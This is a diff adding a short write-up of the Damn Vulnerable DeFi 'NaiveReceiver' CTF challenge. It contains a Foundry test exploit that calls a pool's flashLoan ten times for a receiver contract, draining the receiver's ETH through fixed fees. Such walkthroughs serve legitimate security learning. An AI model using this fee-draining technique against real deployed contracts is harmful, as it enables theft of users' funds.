@@ -35,6 +35,42 @@ https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/01
 
 ## Challenge 2: NaiveReceiver ##
 
+This time, you got to watch how is succesful challenge validated.
+
+```
+    function validation() internal {
+        // All ETH has been drained from the receiver
+        assertEq(address(flashLoanReceiver).balance, 0);
+        assertEq(
+            address(naiveReceiverLenderPool).balance,
+            ETHER_IN_POOL + ETHER_IN_RECEIVER
+        );
+    }
+```
+
+So you can see that you need to transfer eth from receiver to lender. To do this, just call flashLoan function 10 times to transfer (consume)
+all receiver ethers as fees. (Flashloan amount doesn't matter because fee is always 1 ETH)
+
+```
+    function testExploit() public {
+        /** EXPLOIT START **/
+        vm.startPrank(attacker);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
+        naiveReceiverLenderPool.flashLoan(address(flashLoanReceiver), 1);
+        vm.stopPrank();
+        /** EXPLOIT END **/
+        validation();
+    }
+```
+
 Source Code:
 https://github.com/devnet0x/Blockchain/tree/master/ChallengesCTF/DVDF_Foundry/02_NaiveReceiver
 
